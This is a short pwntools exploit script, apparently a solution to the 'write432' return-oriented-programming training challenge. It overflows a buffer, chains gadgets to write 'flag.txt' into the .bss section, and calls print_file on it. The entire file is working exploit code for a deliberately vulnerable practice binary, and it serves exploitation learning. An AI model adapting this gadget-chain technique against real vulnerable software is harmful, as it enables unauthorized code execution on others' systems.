from pwn import *
elf= context.binary= ELF('./write432', checksec=False)
p=process(elf.path)

##WRITE32
offset= 44
bss_data=0x0804a020
print_file=0x080483d0
pop_edi=0x080485aa ##pop edi; pop ebp; ret;
mov_edi=0x08048543 ##mov dword ptr [edi], ebp; ret;

payload = b"A" * offset


payload += p32(pop_edi)
payload += p32(bss_data)
payload += b"flag"
payload += p32(mov_edi)


payload += p32(pop_edi)
payload += p32(bss_data + 4)
payload += b".txt"
payload += p32(mov_edi)


payload += p32(print_file)
payload += p32(0x0)
payload += p32(bss_data)

p.sendline(payload)
p.interactive()